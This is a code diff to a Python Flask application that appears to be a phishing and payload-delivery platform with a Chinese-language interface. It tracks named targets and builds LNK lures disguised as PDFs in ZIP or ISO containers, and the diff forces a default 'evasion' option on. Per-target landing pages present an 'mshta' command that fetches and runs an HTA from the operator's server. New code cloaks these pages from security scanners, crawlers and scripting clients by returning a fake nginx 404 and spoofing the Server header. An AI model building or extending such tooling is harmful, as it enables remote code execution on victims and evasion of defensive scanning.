@@ -174,10 +174,13 @@ def targets():
         t['lnk_exists'] = _lnk_exists(t['unique_token'])
         t['landing_url'] = f"{landing_base}/p/{t['unique_token']}"
     server_configured = _check_server_configured()
+    from .config_manager import load_config
+    landing_enabled = load_config().get('landing_enabled', True)
     return render_template(
         'targets.html',
         targets=all_targets,
         server_configured=server_configured,
+        landing_enabled=landing_enabled,
         pagination=pagination,
         page_sizes=PAGE_SIZES,
     )
@@ -978,12 +981,14 @@ def exe_config():
         if request.form.get('save_lnk'):
             from .lnk_builder import (
                 LURE_EXT_CHOICES, EVASION_CHOICES, CONTAINER_KEYS,
+                DEFAULT_EVASION,
             )
             ext = request.form.get('lnk_lure_ext', 'pdf').strip().lower()
             container = request.form.get('lnk_container', 'zip').strip().lower()
             password = request.form.get('lnk_zip_password', '').strip()[:128]
             selected = set(request.form.getlist('lnk_evasion'))
-            evasion = [key for key in EVASION_CHOICES if key in selected]
+            evasion = [key for key in EVASION_CHOICES
+                       if key in selected or key == DEFAULT_EVASION]
             if ext not in LURE_EXT_CHOICES:
                 flash('不支持的 LNK 伪装后缀', 'error')
             elif container not in CONTAINER_KEYS:
@@ -1026,7 +1031,7 @@ def exe_config():
 
     config = load_config()
     preview = config['name_template'].replace('{name}', '张三').replace('{token8}', 'a1b2c3d4').replace('{token}', 'a1b2c3d4-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
-    from .lnk_builder import LURE_EXT_CHOICES, EVASION_OPTIONS, CONTAINER_CHOICES
+    from .lnk_builder import LURE_EXT_CHOICES, EVASION_OPTIONS, EVASION_RESULTS, CONTAINER_CHOICES
     lure_ext = config.get('lnk_lure_ext', 'pdf')
     container = config.get('lnk_container', 'zip')
     lnk_preview = f'{preview}.iso' if container == 'iso' else f'{preview}.zip'
@@ -1041,6 +1046,7 @@ def exe_config():
         landing_preview=landing_preview, presets=presets,
         lure_ext_choices=LURE_EXT_CHOICES,
         evasion_options=EVASION_OPTIONS,
+        evasion_results=EVASION_RESULTS,
         container_choices=CONTAINER_CHOICES,
         lnk_evasion=config.get('lnk_evasion', []),
     )
@@ -1251,24 +1257,56 @@ def _client_ua():
     return request.headers.get('User-Agent', '')[:300]
 
 
+# Built-in UA gate: only mainstream browser requests see the landing page.
+# Non-browser clients (scan tools, crawlers, scripts) get a fake nginx 404.
+_LANDING_UA_BLOCKLIST = (
+    'bot', 'spider', 'crawl', 'headless', 'curl/', 'wget/', 'python-',
+    'python/', 'go-http-client', 'java/', 'httpie', 'libwww', 'scrapy',
+    'phantomjs', 'selenium', 'playwright', 'masscan', 'nmap', 'zgrab',
+    'sqlmap', 'nuclei',
+)
+
+
+def _landing_ua_allowed():
+    ua = request.headers.get('User-Agent', '')
+    if len(ua) < 40 or 'Mozilla/5.0' not in ua:
+        return False
+    lowered = ua.lower()
+    return not any(marker in lowered for marker in _LANDING_UA_BLOCKLIST)
+
+
+def _fake_nginx_404():
+    response = current_app.response_class(
+        render_template('nginx_404.html'), status=404, mimetype='text/html'
+    )
+    response.headers['Server'] = 'nginx'
+    return response
+
+
 @routes_api.route('/p/<token>')
 def landing_page(token):
     target = _landing_target(token)
-    if not target:
-        return 'Not Found', 404
+    if not target or not _landing_ua_allowed():
+        return _fake_nginx_404()
     add_landing_event(target['id'], 'visit', request.remote_addr or '', _client_ua())
     run_url = url_for('routes_api.landing_hta', token=token, _external=True)
-    return render_template(
-        'landing.html', token=token, target=target,
-        run_url=run_url, command=f'mshta "{run_url}"',
+    response = current_app.response_class(
+        render_template(
+            'landing.html', token=token, target=target,
+            run_url=run_url, command=f'mshta "{run_url}"',
+        ),
+        mimetype='text/html',
     )
+    response.headers['Server'] = 'nginx'
+    response.headers['Cache-Control'] = 'no-store'
+    return response
 
 
 @routes_api.route('/p/<token>/event', methods=['POST'])
 def landing_event(token):
     target = _landing_target(token)
-    if not target:
-        return jsonify({'status': 'error'}), 404
+    if not target or not _landing_ua_allowed():
+        return _fake_nginx_404()
     payload = request.get_json(silent=True) or request.form
     event = str(payload.get('event', '')).strip().lower()
     if event not in ('copy', 'visit'):
